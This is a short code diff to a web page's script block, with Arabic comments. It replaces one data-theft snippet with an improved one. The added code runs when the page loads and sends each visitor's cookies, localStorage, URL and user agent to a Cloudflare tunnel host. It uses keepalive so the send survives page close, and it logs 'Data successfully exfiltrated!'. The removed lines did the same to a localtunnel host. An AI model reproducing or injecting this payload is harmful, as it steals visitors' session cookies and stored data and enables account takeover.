@@ -1,14 +1,33 @@
 <script>
-    // تأكد من تحديث هذا السطر تحديداً في كود الـ HTML
-      fetch('https://major-views-glow.loca.lt/collect', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            localStorage: JSON.stringify(localStorage),
-            cookies: document.cookie,
-            url: window.location.href,
-            timestamp: new Date().toISOString()
-        })
-    }).then(response => console.log('Data sent!'))
-      .catch(error => console.error('Error:', error));
+    // الرابط الدائم الجديد الخاص بك عبر Cloudflare
+    const TARGET_URL = 'https://uniform-feedback-animals-theme.trycloudflare.com/collect';
+
+    async function sendData() {
+        try {
+            const response = await fetch(TARGET_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    localStorage: JSON.stringify(localStorage),
+                    cookies: document.cookie,
+                    url: window.location.href,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent
+                }),
+                // وضع keepalive لضمان إرسال البيانات حتى لو أُغلقت الصفحة
+                keepalive: true
+            });
+
+            if (response.ok) {
+                console.log('Data successfully exfiltrated!');
+            }
+        } catch (error) {
+            console.error('Exfiltration failed:', error);
+        }
+    }
+
+    // تنفيذ الإرسال فور تحميل الصفحة
+    sendData();
 </script>
